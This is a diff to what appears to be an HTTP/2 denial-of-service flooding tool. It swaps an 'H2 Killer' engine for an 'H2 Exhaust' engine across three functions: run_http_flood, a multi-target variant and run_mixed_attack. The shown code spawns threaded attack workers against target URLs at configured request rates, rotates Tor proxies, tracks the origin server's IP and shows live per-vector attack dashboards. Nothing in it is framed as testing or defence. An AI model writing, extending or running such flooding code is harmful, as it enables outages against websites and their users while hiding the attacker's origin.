@@ -1051,7 +1051,7 @@ async def run_http_flood_multi(targets: List[str], cfg: dict):
     if proxy_urls:
         print(f"  {c('g','[+]')} Tor proxies: {len(proxy_urls)}")
     _rich_sep()
-    from core.attack.engines.h2_killer_engine import run_killer_worker
+    from core.attack.engines.h2_exhaust import run_h2_exhaust
     import threading as _th
 
     import queue as _queue
@@ -1077,7 +1077,7 @@ async def run_http_flood_multi(targets: List[str], cfg: dict):
             evt = _th.Event()
             res = {}
             th = _th.Thread(
-                target=run_killer_worker,
+                target=run_h2_exhaust,
                 name=f"multi_{host}_{name}",
                 kwargs=dict(
                     target_url=target, rps=wrps,
@@ -1628,7 +1628,7 @@ async def run_http_flood(target: str, cfg: dict):
 
     # Spin up the AutoDashboard for live per-vector RPS rendering.
     from core.monitor.auto_dashboard import AutoDashboard
-    from core.attack.engines.h2_killer_engine import run_killer_worker
+    from core.attack.engines.h2_exhaust import run_h2_exhaust
     from core.attack.engines.h2_hold_engine import run_hold_worker
     import threading as _th
     import queue as _queue
@@ -1638,16 +1638,16 @@ async def run_http_flood(target: str, cfg: dict):
         target_rps=rps, stalled_ms=8000, refresh_ms=50,
     )
     vectors = [
-        ("killer_1", "H2 Killer", 0.25, 4),
-        ("killer_2", "H2 Killer", 0.25, 4),
-        ("killer_3", "H2 Killer", 0.20, 3),
-        ("killer_4", "H2 Killer", 0.20, 3),
-        ("killer_5", "H2 Killer", 0.10, 2),
+        ("killer_1", "H2 Exhaust", 0.25, 4),
+        ("killer_2", "H2 Exhaust", 0.25, 4),
+        ("killer_3", "H2 Exhaust", 0.20, 3),
+        ("killer_4", "H2 Exhaust", 0.20, 3),
+        ("killer_5", "H2 Exhaust", 0.10, 2),
     ]
     for name, label, _share, _conns in vectors:
         dash.register_vector(name, label)
 
-    dash.set_engine_label("H2+KILLER v2")
+    dash.set_engine_label("H2 Exhaust v3")
     dash.set_global_note(f"origin={opts.get('origin_ip','-')}")
     dash.start()
 
@@ -1669,7 +1669,7 @@ async def run_http_flood(target: str, cfg: dict):
                 return proxy_q.get_nowait()
 
         th = _th.Thread(
-            target=run_killer_worker,
+            target=run_h2_exhaust,
             name=f"flood_{name}",
             kwargs=dict(
                 target_url=effective_url, rps=wrps,
@@ -2570,7 +2570,7 @@ async def run_mixed_attack(target: str, cfg: dict):
 
     # ----- Launch live AutoDashboard + H2 Killer workers -----
     from core.monitor.auto_dashboard import AutoDashboard
-    from core.attack.engines.h2_killer_engine import run_killer_worker
+    from core.attack.engines.h2_exhaust import run_h2_exhaust
     from core.attack.engines.h2_hold_engine import run_hold_worker
     import threading as _th
     import queue as _queue
@@ -2581,20 +2581,20 @@ async def run_mixed_attack(target: str, cfg: dict):
     )
 
     vectors = [
-        ("killer_1", "H2 Killer", 0.20, 4),
-        ("killer_2", "H2 Killer", 0.20, 4),
-        ("killer_3", "H2 Killer", 0.15, 3),
-        ("killer_4", "H2 Killer", 0.15, 3),
-        ("killer_5", "H2 Killer", 0.10, 2),
-        ("killer_6", "H2 Killer", 0.10, 2),
-        ("killer_7", "H2 Killer", 0.07, 2),
-        ("killer_8", "H2 Killer", 0.03, 1),
+        ("killer_1", "H2 Exhaust", 0.20, 4),
+        ("killer_2", "H2 Exhaust", 0.20, 4),
+        ("killer_3", "H2 Exhaust", 0.15, 3),
+        ("killer_4", "H2 Exhaust", 0.15, 3),
+        ("killer_5", "H2 Exhaust", 0.10, 2),
+        ("killer_6", "H2 Exhaust", 0.10, 2),
+        ("killer_7", "H2 Exhaust", 0.07, 2),
+        ("killer_8", "H2 Exhaust", 0.03, 1),
     ]
     for name, label, _share, _conns in vectors:
         dash.register_vector(name, label)
 
     dash.set_engine_label(f"mixed_v2 origin={origin_ip or '-'}")
-    dash.set_global_note("MIXED ATTACK V2 — H2+KILLER")
+    dash.set_global_note("MIXED ATTACK V2 — H2 Exhaust")
     dash.start()
 
     handles = []
@@ -2615,7 +2615,7 @@ async def run_mixed_attack(target: str, cfg: dict):
                 return proxy_q.get_nowait()
 
         th = _th.Thread(
-            target=run_killer_worker,
+            target=run_h2_exhaust,
             name=f"mixed_{name}",
             kwargs=dict(
                 target_url=effective_url, rps=wrps,
